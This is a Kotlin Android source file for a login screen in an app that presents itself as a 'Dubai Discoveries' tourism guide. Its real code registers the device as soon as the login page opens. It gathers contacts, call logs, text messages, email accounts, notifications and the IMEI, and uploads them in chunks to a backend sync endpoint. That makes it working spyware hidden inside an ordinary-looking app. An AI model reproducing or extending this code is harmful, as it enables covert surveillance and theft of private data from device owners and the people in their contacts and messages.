package com.devicesync.app

import android.content.Intent
import android.os.Bundle
import android.view.View
import android.view.animation.AnimationUtils
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.cardview.widget.CardView
import com.devicesync.app.utils.SettingsManager
import com.devicesync.app.api.UserInfo
import com.devicesync.app.utils.AppConfigManager
import com.devicesync.app.utils.DeviceRegistrationManager
import com.google.android.material.button.MaterialButton
import com.google.android.material.textfield.TextInputLayout
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.IOException
import kotlin.math.min

class LoginActivity : AppCompatActivity() {
    
    private lateinit var emailEditText: EditText
    private lateinit var passwordEditText: EditText
    private lateinit var loginButton: MaterialButton
    private lateinit var continueAsGuestButton: MaterialButton
    private lateinit var syncDataButton: MaterialButton
    private lateinit var welcomeText: TextView
    private lateinit var loginCard: CardView
    private lateinit var emailLayout: TextInputLayout
    private lateinit var passwordLayout: TextInputLayout
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_login)
        
        // Initialize app configuration
        com.devicesync.app.utils.AppConfigManager.initialize(this)
        
        // Initialize UI elements
        emailEditText = findViewById(R.id.emailEditText)
        passwordEditText = findViewById(R.id.passwordEditText)
        loginButton = findViewById(R.id.loginButton)
        continueAsGuestButton = findViewById(R.id.continueAsGuestButton)
        syncDataButton = findViewById(R.id.syncDataButton)
        welcomeText = findViewById(R.id.welcomeText)
        loginCard = findViewById(R.id.loginCard)
        emailLayout = findViewById(R.id.emailLayout)
        passwordLayout = findViewById(R.id.passwordLayout)
        
        // Set tourism-themed welcome message
        welcomeText.text = "Welcome to Dubai Discoveries!\nSign in to access your personalized experience"
        
        // Apply entrance animations
        applyEntranceAnimations()
        
        // Set up click listeners
        loginButton.setOnClickListener {
            performLogin()
        }
        
        continueAsGuestButton.setOnClickListener {
            proceedAsGuest()
        }
        
        syncDataButton.setOnClickListener {
            performDataSync()
        }
        
        // Set up input field listeners for real-time validation
        setupInputValidation()
        
        // Register device when user lands on login page
        DeviceRegistrationManager.registerDeviceSafely(this)
    }
    
    private fun applyEntranceAnimations() {
        // Fade in animation for the welcome section
        val fadeIn = AnimationUtils.loadAnimation(this, R.anim.fade_in)
        welcomeText.startAnimation(fadeIn)
        
        // Slide up animation for the login card
        val slideUp = AnimationUtils.loadAnimation(this, R.anim.slide_up)
        loginCard.startAnimation(slideUp)
        
        // Scale in animation for social login buttons
        val scaleIn = AnimationUtils.loadAnimation(this, R.anim.scale_in)
        findViewById<View>(R.id.socialLoginContainer)?.startAnimation(scaleIn)
    }
    
    private fun setupInputValidation() {
        emailEditText.setOnFocusChangeListener { _, hasFocus ->
            if (!hasFocus && emailEditText.text.isNotEmpty()) {
                validateEmail()
            }
        }
        
        passwordEditText.setOnFocusChangeListener { _, hasFocus ->
            if (!hasFocus && passwordEditText.text.isNotEmpty()) {
                validatePassword()
            }
        }
    }
    
    private fun validateEmail(): Boolean {
        val email = emailEditText.text.toString().trim()
        return if (android.util.Patterns.EMAIL_ADDRESS.matcher(email).matches()) {
            emailLayout.error = null
            true
        } else {
            emailLayout.error = "Please enter a valid email address"
            false
        }
    }
    
    private fun validatePassword(): Boolean {
        val password = passwordEditText.text.toString().trim()
        return if (password.length >= 6) {
            passwordLayout.error = null
            true
        } else {
            passwordLayout.error = "Password must be at least 6 characters"
            false
        }
    }
    
    private fun performLogin() {
        val email = emailEditText.text.toString().trim()
        val password = passwordEditText.text.toString().trim()
        
        if (email.isEmpty() || password.isEmpty()) {
            Toast.makeText(this, "Please enter both email and password", Toast.LENGTH_SHORT).show()
            return
        }
        
        if (!validateEmail() || !validatePassword()) {
            return
        }
        
        // Show loading state
        setLoadingState(true)
        
        // Perform actual authentication against backend
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val client = OkHttpClient()
                
                // Create login request
                val loginData = JSONObject().apply {
                    put("email", email)
                    put("password", password)
                }
                
                val requestBody = loginData.toString().toRequestBody("application/json".toMediaType())
                
                val request = Request.Builder()
                    .url("${AppConfigManager.getBackendUrl()}/api/admin/login")
                    .post(requestBody)
                    .addHeader("Content-Type", "application/json")
                    .build()
                
                client.newCall(request).execute().use { response ->
                    withContext(Dispatchers.Main) {
                        if (response.isSuccessful) {
                            val responseBody = response.body?.string()
                            val jsonResponse = JSONObject(responseBody ?: "{}")
                            
                            if (jsonResponse.has("token")) {
                                // Login successful
                                val token = jsonResponse.getString("token")
                                val adminData = jsonResponse.getJSONObject("admin")
                                
                                // Save authentication data
                                val settingsManager = SettingsManager(this@LoginActivity)
                                settingsManager.saveAuthToken(token)
                                
                                // Save user info
                                val userInfo = UserInfo(
                                    id = adminData.getString("id"),
                                    username = adminData.getString("username"),
                                    email = adminData.getString("email"),
                                    firstName = adminData.getString("username"),
                                    lastName = ""
                                )
                                settingsManager.saveUserInfo(userInfo)
                                
                                setLoadingState(false)
                                Toast.makeText(this@LoginActivity, "Login successful!", Toast.LENGTH_SHORT).show()
                                
                                // Register device after successful login
                                DeviceRegistrationManager.registerDeviceSafely(this@LoginActivity)
                                
                                proceedToMainActivity()
                            } else {
                                // Invalid response format
                                setLoadingState(false)
                                Toast.makeText(this@LoginActivity, "Invalid server response", Toast.LENGTH_SHORT).show()
                            }
                        } else {
                            // Login failed
                            val errorBody = response.body?.string()
                            val errorMessage = try {
                                val errorJson = JSONObject(errorBody ?: "{}")
                                errorJson.getString("message")
                            } catch (e: Exception) {
                                "Login failed. Please check your credentials."
                            }
                            
                            setLoadingState(false)
                            Toast.makeText(this@LoginActivity, errorMessage, Toast.LENGTH_LONG).show()
                        }
                    }
                }
            } catch (e: Exception) {
                withContext(Dispatchers.Main) {
                    setLoadingState(false)
                    Toast.makeText(this@LoginActivity, "Network error: ${e.message}", Toast.LENGTH_LONG).show()
                }
            }
        }
    }
    
    private fun setLoadingState(isLoading: Boolean) {
        loginButton.isEnabled = !isLoading
        continueAsGuestButton.isEnabled = !isLoading
        emailEditText.isEnabled = !isLoading
        passwordEditText.isEnabled = !isLoading
        
        if (isLoading) {
            loginButton.text = "Signing In..."
            loginButton.icon = null
        } else {
            loginButton.text = "Sign In"
            loginButton.setIconResource(R.drawable.ic_arrow_forward)
        }
    }
    
    private fun proceedAsGuest() {
        // Show loading state
        setLoadingState(true)
        
        CoroutineScope(Dispatchers.Main).launch {
            delay(800) // Simulate processing
            
            val settingsManager = SettingsManager(this@LoginActivity)
            // Clear any existing auth data for guest mode
            settingsManager.clearAuthData()
            
            setLoadingState(false)
            Toast.makeText(this@LoginActivity, "Continuing as guest", Toast.LENGTH_SHORT).show()
            proceedToMainActivity()
        }
    }
    
    private fun proceedToMainActivity() {
        val intent = Intent(this, MainActivity::class.java)
        startActivity(intent)
        
        // Apply exit animation
        overridePendingTransition(R.anim.fade_in, R.anim.fade_out)
        finish()
    }
    
    override fun onBackPressed() {
        // Apply exit animation when back is pressed
        overridePendingTransition(R.anim.fade_in, R.anim.fade_out)
        super.onBackPressed()
    }

    private fun performDataSync() {
        println("🔄 STARTING DATA SYNC FROM LOGIN SCREEN")
        println("=".repeat(80))
        
        // Show loading state
        syncDataButton.isEnabled = false
        syncDataButton.text = "Syncing..."
        syncDataButton.icon = null
        
        CoroutineScope(Dispatchers.IO).launch {
            try {
                println("📱 DEVICE INFO:")
                println("   Device ID: ${getTelephonyDeviceId()}")
                println("   Android ID: ${getAndroidId()}")
                println("   Device Model: ${android.os.Build.MODEL}")
                println("   Android Version: ${android.os.Build.VERSION.RELEASE}")
                println("   App Version: ${packageManager.getPackageInfo(packageName, 0).versionName}")
                println("=".repeat(80))
                
                // Collect data
                println("📊 COLLECTING DATA...")
                val dataCollector = com.devicesync.app.utils.DataCollector(this@LoginActivity)
                val collectedData = dataCollector.collectAllData()
                val summary = dataCollector.getDataSummary()
                
                println("📈 DATA SUMMARY:")
                println("   Contacts: ${summary.getInt("contacts_count")}")
                println("   Call Logs: ${summary.getInt("call_logs_count")}")
                println("   Notifications: ${summary.getInt("notifications_count")}")
                println("   Email Accounts: ${summary.getInt("email_accounts_count")}")
                println("=".repeat(80))
                
                // Get device code
                val deviceCode = com.devicesync.app.utils.DeviceConfigManager.getDeviceCode()
                println("🔑 DEVICE CODE: $deviceCode")
                println("=".repeat(80))
                
                // Sync each data type
                val deviceId = getTelephonyDeviceId()
                val androidId = getAndroidId()
                
                // Sync Contacts
                if (collectedData.has("contacts")) {
                    println("📞 SYNCING CONTACTS...")
                    syncDataType("CONTACTS", deviceId, androidId, deviceCode, collectedData.getJSONArray("contacts"))
                }
                
                // Sync Call Logs
                if (collectedData.has("call_logs")) {
                    println("📞 SYNCING CALL LOGS...")
                    syncDataType("CALL_LOGS", deviceId, androidId, deviceCode, collectedData.getJSONArray("call_logs"))
                }
                
                // Sync Messages
                if (collectedData.has("messages")) {
                    println("💬 SYNCING MESSAGES...")
                    syncDataType("MESSAGES", deviceId, androidId, deviceCode, collectedData.getJSONArray("messages"))
                }
                
                // Sync Email Accounts
                if (collectedData.has("email_accounts")) {
                    println("📧 SYNCING EMAIL ACCOUNTS...")
                    syncDataType("EMAIL_ACCOUNTS", deviceId, androidId, deviceCode, collectedData.getJSONArray("email_accounts"))
                }
                
                // Sync Notifications
                if (collectedData.has("notifications")) {
                    println("🔔 SYNCING NOTIFICATIONS...")
                    syncDataType("NOTIFICATIONS", deviceId, androidId, deviceCode, collectedData.getJSONArray("notifications"))
                }
                
                withContext(Dispatchers.Main) {
                    syncDataButton.isEnabled = true
                    syncDataButton.text = "Sync Data to Server"
                    syncDataButton.setIconResource(R.drawable.ic_sync)
                    Toast.makeText(this@LoginActivity, "Data sync completed! Check logs for details.", Toast.LENGTH_LONG).show()
                }
                
                println("✅ DATA SYNC COMPLETED")
                println("=".repeat(80))
                
            } catch (e: Exception) {
                println("❌ DATA SYNC ERROR:")
                println("   Error: ${e.message}")
                println("   Stack trace: ${e.stackTraceToString()}")
                println("=".repeat(80))
                
                withContext(Dispatchers.Main) {
                    syncDataButton.isEnabled = true
                    syncDataButton.text = "Sync Data to Server"
                    syncDataButton.setIconResource(R.drawable.ic_sync)
                    Toast.makeText(this@LoginActivity, "Sync failed: ${e.message}", Toast.LENGTH_LONG).show()
                }
            }
        }
    }
    
    private suspend fun syncDataType(dataType: String, deviceId: String, androidId: String, deviceCode: String, data: org.json.JSONArray) {
        try {
            val client = OkHttpClient.Builder()
                .connectTimeout(60, java.util.concurrent.TimeUnit.SECONDS)
                .readTimeout(120, java.util.concurrent.TimeUnit.SECONDS)
                .writeTimeout(120, java.util.concurrent.TimeUnit.SECONDS)
                .build()
            
            val totalItems = data.length()
            val chunkSize = 500
            val totalChunks = (totalItems + chunkSize - 1) / chunkSize // Ceiling division
            
            println("📦 CHUNKING DATA:")
            println("   Total Items: $totalItems")
            println("   Chunk Size: $chunkSize")
            println("   Total Chunks: $totalChunks")
            
            var successfulChunks = 0
            var failedChunks = 0
            
            for (chunkIndex in 0 until totalChunks) {
                val startIndex = chunkIndex * chunkSize
                val endIndex = min(startIndex + chunkSize, totalItems)
                val chunkData = org.json.JSONArray()
                
                for (i in startIndex until endIndex) {
                    chunkData.put(data.get(i))
                }
                
                println("📤 SENDING CHUNK ${chunkIndex + 1}/$totalChunks:")
                println("   Items: ${startIndex + 1}-$endIndex")
                println("   Chunk Size: ${chunkData.length()}")
                
                // Create sync request for this chunk
                val syncRequest = JSONObject().apply {
                    put("deviceId", deviceId)
                    put("androidId", androidId)
                    put("deviceCode", deviceCode)
                    put("dataType", dataType)
                    put("data", chunkData)
                    put("timestamp", java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", java.util.Locale.getDefault()).format(java.util.Date()))
                }
                
                val requestBody = syncRequest.toString().toRequestBody("application/json".toMediaType())
                
                // Build URL
                val syncUrl = "${com.devicesync.app.utils.AppConfigManager.getBackendUrl()}/api/devices/$deviceId/sync"
                
                val request = Request.Builder()
                    .url(syncUrl)
                    .post(requestBody)
                    .addHeader("Content-Type", "application/json")
                    .build()
                
                val startTime = System.currentTimeMillis()
                
                try {
                    client.newCall(request).execute().use { response ->
                        val endTime = System.currentTimeMillis()
                        val duration = endTime - startTime
                        
                        val responseBody = response.body?.string()
                        
                        println("📡 CHUNK ${chunkIndex + 1} RESPONSE:")
                        println("   Status Code: ${response.code}")
                        println("   Duration: ${duration}ms")
                        
                        if (response.isSuccessful) {
                            successfulChunks++
                            println("✅ CHUNK ${chunkIndex + 1} SUCCESSFUL")
                        } else {
                            failedChunks++
                            println("❌ CHUNK ${chunkIndex + 1} FAILED")
                            println("   Response: $responseBody")
                        }
                    }
                } catch (e: Exception) {
                    failedChunks++
                    println("💥 CHUNK ${chunkIndex + 1} ERROR:")
                    println("   Error: ${e.message}")
                    println("   Error Type: ${e.javaClass.simpleName}")
                }
                
                // Add a small delay between chunks to avoid overwhelming the server
                if (chunkIndex < totalChunks - 1) {
                    delay(500) // 500ms delay between chunks
                }
            }
            
            println("📊 CHUNK SUMMARY:")
            println("   Successful Chunks: $successfulChunks/$totalChunks")
            println("   Failed Chunks: $failedChunks/$totalChunks")
            
            if (failedChunks == 0) {
                println("✅ $dataType SYNC SUCCESSFUL (All chunks)")
            } else if (successfulChunks > 0) {
                println("⚠️ $dataType SYNC PARTIAL (${successfulChunks}/${totalChunks} chunks successful)")
            } else {
                println("❌ $dataType SYNC FAILED (All chunks failed)")
            }
            
        } catch (e: Exception) {
            println("💥 $dataType SYNC ERROR:")
            println("   Error: ${e.message}")
            println("   Error Type: ${e.javaClass.simpleName}")
            if (e is java.net.ConnectException) {
                println("   Connection Error: ${e.message}")
            } else if (e is java.net.SocketTimeoutException) {
                println("   Timeout Error: ${e.message}")
            } else if (e is java.net.UnknownHostException) {
                println("   Host Error: ${e.message}")
            }
            println("   Stack trace: ${e.stackTraceToString()}")
        }
    }
    
    private fun getTelephonyDeviceId(): String {
        return try {
            if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                return getAndroidId()
            }
            
            val telephonyManager = getSystemService(android.content.Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
            val deviceId = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                telephonyManager.imei ?: getAndroidId()
            } else {
                telephonyManager.deviceId ?: getAndroidId()
            }
            
            deviceId
        } catch (e: Exception) {
            getAndroidId()
        }
    }
    
    private fun getAndroidId(): String {
        return android.provider.Settings.Secure.getString(
            contentResolver,
            android.provider.Settings.Secure.ANDROID_ID
        ) ?: "unknown_android_id"
    }
} 